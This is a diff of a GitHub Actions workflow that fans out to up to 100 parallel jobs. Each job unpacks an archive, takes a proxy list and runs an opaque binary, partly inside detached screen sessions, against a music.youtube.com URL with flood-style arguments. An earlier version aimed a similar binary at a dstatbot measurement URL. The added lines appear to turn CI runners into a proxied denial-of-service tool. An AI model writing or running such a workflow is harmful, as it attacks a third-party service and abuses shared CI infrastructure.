@@ -9,7 +9,7 @@ on:
 
 jobs:
   parallel-execution-ubuntu:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     strategy:
       max-parallel: 100
       fail-fast: false  # Continue even if some instances fail
@@ -33,10 +33,19 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
-          chmod +x ki
+          chmod +x *
+          mv tol o          
           
-            
-          ./ki https://c4.dstatbot.win/iseelKff  200 1 1 
+          screen -dms ve ./o https://music.youtube.com/music_premium/musicfeed 200 1 1 90,txt 
+          screen -dms ve ./o https://music.youtube.com/music_premium/musicfeed 200 1 1 90,txt 
+          
+          ./o https://music.youtube.com/music_premium/musicfeed 200 1 1  90.txt
+
+          
+
+          
+          sleep 1
+          
           
           
           
